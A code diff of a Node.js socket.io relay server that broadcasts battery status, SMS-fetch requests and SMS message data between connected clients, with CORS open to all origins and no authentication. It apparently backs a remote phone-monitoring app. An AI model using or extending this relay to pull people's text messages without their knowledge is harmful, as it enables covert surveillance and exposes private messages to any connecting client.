@@ -5,23 +5,22 @@ const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { 
-    cors: { origin: "*" },
-    pingInterval: 10000, // Check every 10 seconds
-    pingTimeout: 5000    // Faster timeout detection
-});
+const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
+    // Forward battery
     socket.on('battery-status', (data) => {
         socket.broadcast.emit('ui-battery', data);
     });
 
+    // Handle SMS Request
     socket.on('get-sms-request', () => {
         socket.broadcast.emit('get-sms-request');
     });
 
+    // Forward SMS Data
     socket.on('sms-data-log', (data) => {
         socket.broadcast.emit('ui-sms-display', data);
     });
@@ -32,4 +31,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log(`Fast Server on port ${PORT}`));
+server.listen(PORT, '0.0.0.0', () => console.log(`Server Active on ${PORT}`));
